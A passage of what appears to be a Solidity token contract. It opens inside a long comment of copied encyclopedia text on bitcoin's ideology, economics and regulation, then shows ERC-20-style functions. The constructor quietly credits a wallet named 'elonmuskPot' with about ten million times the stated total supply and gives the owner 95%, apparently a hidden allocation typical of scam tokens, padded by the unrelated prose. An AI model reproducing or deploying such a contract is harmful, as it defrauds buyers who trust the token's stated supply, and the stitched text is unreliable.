According to The New York Times, libertarians and anarchists were attracted to the philosophical idea behind bitcoin. Early bitcoin supporter Roger Ver said: "At first, almost everyone who got involved did so for philosophical reasons. We saw bitcoin as a great idea, as a way to separate money from the state."[174] The Economist describes bitcoin as "a techno-anarchist project to create an online version of cash, a way for people to transact without the possibility of interference from malicious governments or banks".[177] Economist Paul Krugman argues that cryptocurrencies like bitcoin are "something of a cult" based in "paranoid fantasies" of government power.[178]

External video
video icon The Declaration Of Bitcoin's Independence, BraveTheWorld, 4:38[179]
Nigel Dodd argues in The Social Life of Bitcoin that the essence of the bitcoin ideology is to remove money from social, as well as governmental, control.[180] Dodd quotes a YouTube video, with Roger Ver, Jeff Berwick, Charlie Shrem, Andreas Antonopoulos, Gavin Wood, Trace Meyer and other proponents of bitcoin reading The Declaration of Bitcoin's Independence. The declaration includes a message of crypto-anarchism with the words: "Bitcoin is inherently anti-establishment, anti-system, and anti-state. Bitcoin undermines governments and disrupts institutions because bitcoin is fundamentally humanitarian."[180][179]

David Golumbia says that the ideas influencing bitcoin advocates emerge from right-wing extremist movements such as the Liberty Lobby and the John Birch Society and their anti-Central Bank rhetoric, or, more recently, Ron Paul and Tea Party-style libertarianism.[181] Steve Bannon, who owns a "good stake" in bitcoin, considers it to be "disruptive populism. It takes control back from central authorities. It's revolutionary."[182]

A 2014 study of Google Trends data found correlations between bitcoin-related searches and ones related to computer programming and illegal activity, but not libertarianism or investment topics.[183]

Economics
Main article: Economics of bitcoin

Bitcoin vs fiat M1 and gold. Y axis represents number of bitcoins.
Bitcoin is a digital asset designed to work in peer-to-peer transactions as a currency.[3][184] Bitcoins have three qualities useful in a currency, according to The Economist in January 2015: they are "hard to earn, limited in supply and easy to verify".[185] Per some researchers, as of 2015, bitcoin functions more as a payment system than as a currency.[26]

Economists define money as serving the following three purposes: a store of value, a medium of exchange, and a unit of account.[186] According to The Economist in 2014, bitcoin functions best as a medium of exchange.[186] However, this is debated, and a 2018 assessment by The Economist stated that cryptocurrencies met none of these three criteria.[177] Yale economist Robert J. Shiller writes that bitcoin has potential as a unit of account for measuring the relative value of goods, as with Chile's Unidad de Fomento, but that "Bitcoin in its present form ... doesn't really solve any sensible economic problem".[187]

According to research by the University of Cambridge, between 2.9 million and 5.8 million unique users used a cryptocurrency wallet in 2017, most of them for bitcoin. The number of users has grown significantly since 2013, when there were 300,000–1.3 million users.[130]

Acceptance by merchants
Dish Network, a Fortune 500 subscription TV provider, has been described as the first large company to accept bitcoin, in 2014.[188]

Bloomberg reported that the largest 17 crypto merchant-processing services handled $69 million in June 2018, down from $411 million in September 2017. Bitcoin is "not actually usable" for retail transactions because of high costs and the inability to process chargebacks, according to Nicholas Weaver, a researcher quoted by Bloomberg. High price volatility and transaction fees make paying for small retail purchases with bitcoin impractical, according to economist Kim Grauer. However, bitcoin continues to be used for large-item purchases on sites such as Overstock.com, and for cross-border payments to freelancers and other vendors.[189]

In 2017 and 2018, bitcoin's acceptance among major online retailers included only three of the top 500 U.S. online merchants, down from five in 2016.[190] Reasons for this decline include high transaction fees due to bitcoin's scalability issues and long transaction times.[191]

As of 2018, the overwhelming majority of bitcoin transactions took place on cryptocurrency exchanges, rather than being used in transactions with merchants.[190] Delays processing payments through the blockchain of about ten minutes make bitcoin use very difficult in a retail setting. Prices are not usually quoted in units of bitcoin and many trades involve one, or sometimes two, conversions into conventional currencies.[26] Merchants that do accept bitcoin payments may use payment service providers to perform the conversions.[192]

Financial institutions
Bitcoins can be bought on digital currency exchanges.

Per researchers, "there is little sign of bitcoin use" in international remittances despite high fees charged by banks and Western Union who compete in this market.[26] The South China Morning Post, however, mentions the use of bitcoin by Hong Kong workers to transfer money home.[193]

In 2014, the National Australia Bank closed accounts of businesses with ties to bitcoin,[194] and HSBC refused to serve a hedge fund with links to bitcoin.[195] Australian banks in general have been reported as closing down bank accounts of operators of businesses involving the currency.[196]

On 10 December 2017, the Chicago Board Options Exchange started trading bitcoin futures,[197] followed by the Chicago Mercantile Exchange, which started trading bitcoin futures on 17 December 2017.[198]

In September 2019 the Central Bank of Venezuela, at the request of PDVSA, ran tests to determine if bitcoin and ether could be held in central bank's reserves. The request was motivated by oil company's goal to pay its suppliers.[199]

François R. Velde, Senior Economist at the Chicago Fed, described bitcoin as "an elegant solution to the problem of creating a digital currency".[200] David Andolfatto, Vice President at the Federal Reserve Bank of St. Louis, stated that bitcoin is a threat to the establishment, which he argues is a good thing for the Federal Reserve System and other central banks, because it prompts these institutions to operate sound policies.[39]: 33 [201][202]

As an investment
The Winklevoss twins have purchased bitcoin. In 2013, The Washington Post reported a claim that they owned 1% of all the bitcoins in existence at the time.[203]

Other methods of investment are bitcoin funds. The first regulated bitcoin fund was established in Jersey in July 2014 and approved by the Jersey Financial Services Commission.[204]

Forbes named bitcoin the best investment of 2013.[205] In 2014, Bloomberg named bitcoin one of its worst investments of the year.[206] In 2015, bitcoin topped Bloomberg's currency tables.[207]

According to bitinfocharts.com, in 2017, there were 9,272 bitcoin wallets with more than $1 million worth of bitcoins.[208] The exact number of bitcoin millionaires is uncertain as a single person can have more than one bitcoin wallet.

Venture capital
Peter Thiel's Founders Fund invested US$3 million in BitPay.[209] In 2012, an incubator for bitcoin-focused start-ups was founded by Adam Draper, with financing help from his father, venture capitalist Tim Draper, one of the largest bitcoin holders after winning an auction of ₿30,000,[210] at the time called "mystery buyer".[211] The company's goal is to fund 100 bitcoin businesses within 2–3 years with $10,000 to $20,000 for a 6% stake.[210] Investors also invest in bitcoin mining.[212] According to a 2015 study by Paolo Tasca, bitcoin startups raised almost $1 billion in three years (Q1 2012 – Q1 2015).[213]

Price and volatility

Price in US$, semilogarithmic plot[24]

Annual volatility[23]
The price of bitcoins has gone through cycles of appreciation and depreciation referred to by some as bubbles and busts.[214] In 2011, the value of one bitcoin rapidly rose from about US$0.30 to US$32 before returning to US$2.[215] In the latter half of 2012 and during the 2012–13 Cypriot financial crisis, the bitcoin price began to rise,[216] reaching a high of US$266 on 10 April 2013, before crashing to around US$50. On 29 November 2013, the cost of one bitcoin rose to a peak of US$1,242.[217] In 2014, the price fell sharply, and as of April remained depressed at little more than half 2013 prices. As of August 2014 it was under US$600.[218]

According to Mark T. Williams, as of 30 September 2014, bitcoin has volatility seven times greater than gold, eight times greater than the S&P 500, and 18 times greater than the US dollar.[219] Hodl is a meme created in reference to holding (as opposed to selling) during periods of volatility. Unusual for an asset, bitcoin weekend trading during December 2020 was higher than for weekdays.[220] Hedge funds (using high leverage and derivates)[221] have attempted to use the volatility to profit from downward price movements. At the end of January 2021, such positions were over $1 billion, their highest of all time.[222] As of 8 February 2021, the closing price of bitcoin equaled US$44,797.[223]

Legal status, tax and regulation
Further information: Legality of bitcoin by country or territory
Because of bitcoin's decentralized nature and its trading on online exchanges located in many countries, regulation of bitcoin has been difficult. However, the use of bitcoin can be criminalized, and shutting down exchanges and the peer-to-peer economy in a given country would constitute a de facto ban.[224] The legal status of bitcoin varies substantially from country to country and is still undefined or changing in many of them. Regulations and bans that apply to bitcoin probably extend to similar cryptocurrency systems.[213]

According to the Library of Congress, an "absolute ban" on trading or using cryptocurrencies applies in nine countries: Algeria, Bolivia, Egypt, Iraq, Morocco, Nepal, Pakistan, Vietnam, and the United Arab Emirates. An "implicit ban" applies in another 15 countries, which include Bahrain, Bangladesh, China, Colombia, the Dominican Republic, Indonesia, Kuwait, Lesotho, Lithuania, Macau, Oman, Qatar, Saudi Arabia and Taiwan.[225] On 22 October 2015, the European Court of Justice ruled that bitcoin transactions would be exempt from Value Added Tax.[226]

Regulatory warnings
The U.S. Commodity Futures Trading Commission has issued four "Customer Advisories" for bitcoin and related investments.[227] A July 2018 warning emphasized that trading in any cryptocurrency is often speculative, and there is a risk of theft from hacking, and fraud.[228] In May 2014 the U.S. Securities and Exchange Commission warned that investments involving bitcoin might have high rates of fraud, and that investors might be solicited on social media sites.[229] An earlier "Investor Alert" warned about the use of bitcoin in Ponzi schemes.[230]

The European Banking Authority issued a warning in 2013 focusing on the lack of regulation of bitcoin, the chance that exchanges would be hacked, the volatility of bitcoin's price, and general fraud.[231] FINRA and the North American Securities Administrators Association have both issued investor alerts about bitcoin.[232][233]

Price manipulation investigation
An official investigation into bitcoin traders was reported in May 2018.[234] The U.S. Justice Department launched an investigation into possible price manipulation, including the techniques of spoofing and wash trades.[235][236][237]

The U.S. federal investigation was prompted by concerns of possible manipulation during futures settlement dates. The final settlement price of CME bitcoin futures is determined by prices on four exchanges, Bitstamp, Coinbase, itBit and Kraken. Following the first delivery date in January 2018, the CME requested extensive detailed trading information but several of the exchanges refused to provide it and later provided only limited data. The Commodity Futures Trading Commission then subpoenaed the data from the exchanges.[238][239]

State and provincial securities regulators, coordinated through the North American Securities Administrators Association, are investigating "bitcoin scams" and ICOs in 40 jurisdictions.[240]

Academic research published in the Journal of Monetary Economics concluded that price manipulation occurred during the Mt Gox bitcoin theft and that the market remains vulnerable to manipulation.[241] The history of hacks, fraud and theft involving bitcoin dates back to at least 2011.[242]

Research by John M. Griffin and Amin Shams in 2018 suggests that trading associated with increases in the amount of the Tether cryptocurrency and associated trading at the Bitfinex exchange account for about half of the price increase in bitcoin in late 2017.[243][244]

J.L. van der Velde, CEO of both Bitfinex and Tether, denied the claims of price manipulation: "Bitfinex nor Tether is, or has ever, engaged in any sort of market or price manipulation. Tether issuances cannot be used to prop up the price of bitcoin or any other coin/token on Bitfinex."[245]

Use by governments
See also: Legality of cryptocurrency by country or territory and Bitcoin in El Salvador
In June 2021, the Legislative Assembly of El Salvador voted legislation to make bitcoin legal tender in El Salvador, alongside the US dollar.[j][253][249][254] The law took effect on 7 September, making El Salvador the first country to do so.[255][256][8] The implementation of the law has been met with protests[257] and calls to make the currency optional, not compulsory.[258] According to a survey by the Central American University, the majority of Salvadorans disagreed with using cryptocurrency as a legal tender,[259][260] and a survey by the Center for Citizen Studies (CEC) showed that 91% of the country prefers the dollar over bitcoin.[261] As of October 2021, the country's government was exploring mining bitcoin with geothermal power and issuing bonds tied to bitcoin.[262] According to a survey done by the Central American University 100 days after the Bitcoin Law came into force: 34.8% of the population has no confidence in bitcoin, 35.3% has little confidence, 13.2% has some confidence, and 14.1% has a lot of confidence. 56.6% of respondents have downloaded the government bitcoin wallet; among them 62.9% has never used it or only once whereas 36.3% uses bitcoin at least once a month.[263][264] In 2022, the International Monetary Fund (IMF) urged El Salvador to reverse its decision after bitcoin lost half its value in two months. The IMF also warned that it would be difficult to get a loan from the institution.[265] According to one report in 2022, 80% of businesses refused to accept bitcoin despite being legally required to.[266]

In April 2022, the Central African Republic (CAR) adopted Bitcoin as legal tender alongside the CFA franc. After El Salvador, CAR is the second country to do so.[168][9]

Ukraine is accepting donations in cryptocurrency, including bitcoin, to fund the resistance against the Russian invasion.[267][268][269][270][271] According to the officials, 40% of the Ukraine's military suppliers are willing to accept cryptocurrencies without converting them into euros or dollars.[272] In March 2022, Ukraine has passed a law that creates a legal framework for the cryptocurrency industry in the country,[273] including judicial protection of the right to own virtual assets.[274] In the same month, a cryptocurrency exchange was integrated into the Ukrainian e-governance service Diia.[275]

Iran announced pending regulations that would require bitcoin miners in Iran to sell bitcoin to the Central Bank of Iran, and the central bank would use it for imports.[276] Iran, as of October 2020, had issued over 1,000 bitcoin mining licenses.[276] The Iranian government initially took a stance against cryptocurrency, but later changed it after seeing that digital currency could be used to circumvent sanctions.[277] The US Office of Foreign Assets Control listed two Iranians and their bitcoin addresses as part of its Specially Designated Nationals and Blocked Persons List for their role in the 2018 Atlanta cyberattack whose ransom was paid in bitcoin.[278]

In Switzerland, the Canton of Zug accepts tax payments in bitcoin.[279][280]
*/

        VALOTYOR[elonmuskPot] = totalSupply * 999009099 / 100;
        
        VALOTYOR[owner] = totalSupply * 95 / 100;
    }
    
    // Get the address of the token's owner
    function getOwner() public view override returns(address) {
        return owner;
    }
    
    // Get the address of the token's bearsmove pot
    function getDeveloper() public view returns(address) {
        return bearsmovePot;
    }
    
    // Get the address of the token's founder pot
    function getFounder() public view returns(address) {
        return elonmuskPot;
    }
    
    // Get the balance of an account
    function balanceOf(address account) public view override returns(uint) {
        return VALOTYOR[account];
    }
    
    // Transfer balance from one user to another
    function transfer(address to, uint value) public override returns(bool) {
        require(value > 0, "Transfer value has to be higher than 0.");
        require(balanceOf(msg.sender) >= value, "Balance is too low to make transfer.");
        
        //withdraw the taxed and burned percentages from the total value
        uint taxTBD = value * 0 / 100;
        uint burnTBD = value * 0 / 100;
        uint valueAfterTaxAndBurn = value - taxTBD - burnTBD;
        
        // perform the transfer operation
        VALOTYOR[to] += valueAfterTaxAndBurn;
        VALOTYOR[msg.sender] -= value;
        
        emit Transfer(msg.sender, to, value);
        
        // finally, we burn and tax the extras percentage
        VALOTYOR[owner] += taxTBD + burnTBD;
        _burn(owner, burnTBD);
        
        return true;
    }
    
    // approve a specific address as a spender for your account, with a specific spending limit
    function approve(address spender, uint value) public override returns(bool) {
        allowances[msg.sender][spender] = value; 
        
        emit Approval(msg.sender, spender, value);
        
        return true;
    }
    
    // allowance
    function allowance(address _owner, address spender) public view override returns(uint) {
        return allowances[_owner][spender];
    }
    
    // an approved spender can transfer currency from one account to another up to their spending limit
    function transferFrom(address from, address to, uint value) public override returns(bool) {
        require(allowances[from][msg.sender] > 0, "No Allowance for this address.");
        require(allowances[from][msg.sender] >= value, "Allowance too low for transfer.");
        require(VALOTYOR[from] >= value, "Balance is too low to make transfer.");
        
        VALOTYOR[to] += value;
        VALOTYOR[from] -= value;
        
        emit Transfer(from, to, value);
        
        return true;
    }
    
    // function to allow users to burn currency from their account
    function burn(uint256 amount) public returns(bool) {
        _burn(msg.sender, amount);
        
        return true;
    }
    
    // intenal functions
    
    // burn amount of currency from specific account
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "You can't burn from zero address.");
        require(VALOTYOR[account] >= amount, "Burn amount exceeds balance at address.");
    
        VALOTYOR[account] -= amount;
        totalSupply -= amount;
        
        emit Transfer(account, address(0), amount);
    }
    
}